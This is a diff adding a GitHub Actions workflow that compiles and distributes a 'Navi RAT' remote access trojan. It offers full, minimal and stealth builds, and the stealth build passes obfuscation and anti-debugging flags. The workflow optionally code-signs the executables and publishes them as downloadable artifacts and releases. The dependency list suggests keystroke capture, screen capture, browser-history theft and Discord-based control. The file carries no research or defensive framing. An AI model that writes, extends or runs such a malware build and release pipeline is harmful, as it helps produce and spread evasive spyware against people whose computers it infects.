@@ -1,0 +1,106 @@
+name: Build Navi RAT
+
+on:
+  workflow_dispatch:
+    inputs:
+      build_type:
+        description: 'Build configuration'
+        required: true
+        default: 'full'
+        type: choice
+        options:
+          - full
+          - minimal
+          - stealth
+
+jobs:
+  build-rat:
+    runs-on: windows-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Setup Python 3.10
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+          architecture: 'x64'
+
+      - name: Install system dependencies
+        run: |
+          # Install Visual C++ build tools for PyInstaller
+          choco install visualstudio2022buildtools --version=17.8.0 -y --no-progress
+          # Add to PATH
+          echo "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Tools\MSVC\14.38.33130\bin\Hostx64\x64" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
+
+      - name: Cache pip packages
+        uses: actions/cache@v4
+        with:
+          path: ~\AppData\Local\pip\Cache
+          key: ${{ runner.os }}-pip-${{ hashFiles('requirements.txt') }}
+          restore-keys: |
+            ${{ runner.os }}-pip-
+
+      - name: Install Python dependencies
+        run: |
+          python -m pip install --upgrade pip setuptools wheel
+          pip install -r requirements.txt
+          # Extra dependencies for RAT builder
+          pip install pyinstaller pywin32 discord.py requests comtypes pycaw pyautogui browserhistory mss pynput pillow psutil wmi GPUtil
+
+      - name: Verify PyInstaller
+        run: pyinstaller --version
+
+      - name: Build RAT (Full)
+        if: ${{ github.event.inputs.build_type == 'full' }}
+        run: |
+          python modules/builder/rat_builder.py --full --output dist/rat_full.exe
+
+      - name: Build RAT (Minimal)
+        if: ${{ github.event.inputs.build_type == 'minimal' }}
+        run: |
+          python modules/builder/rat_builder.py --minimal --output dist/rat_minimal.exe
+
+      - name: Build RAT (Stealth)
+        if: ${{ github.event.inputs.build_type == 'stealth' }}
+        run: |
+          python modules/builder/rat_builder.py --stealth --obfuscate --anti-debug --output dist/rat_stealth.exe
+
+      - name: Sign executable (optional)
+        if: env.SIGNING_CERT != ''
+        run: |
+          echo "${{ env.SIGNING_CERT }}" | base64 -d > cert.pfx
+          signtool sign /f cert.pfx /p "${{ env.SIGNING_PASSWORD }}" /tr http://timestamp.digicert.com /td sha256 /fd sha256 dist/*.exe
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: navi-rat-${{ github.event.inputs.build_type }}-${{ github.run_number }}
+          path: dist/*.exe
+          retention-days: 30
+
+      - name: Create release (on tag)
+        if: startsWith(github.ref, 'refs/tags/')
+        uses: softprops/action-gh-release@v1
+        with:
+          files: dist/*.exe
+          generate_release_notes: true
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  # Parallel Linux build for cross-platform modules
+  build-linux:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.10'
+      - run: pip install -r requirements.txt
+      - run: python -m py_compile modules/**/*.py
+      - uses: actions/upload-artifact@v4
+        with:
+          name: linux-compiled-modules
+          path: modules/
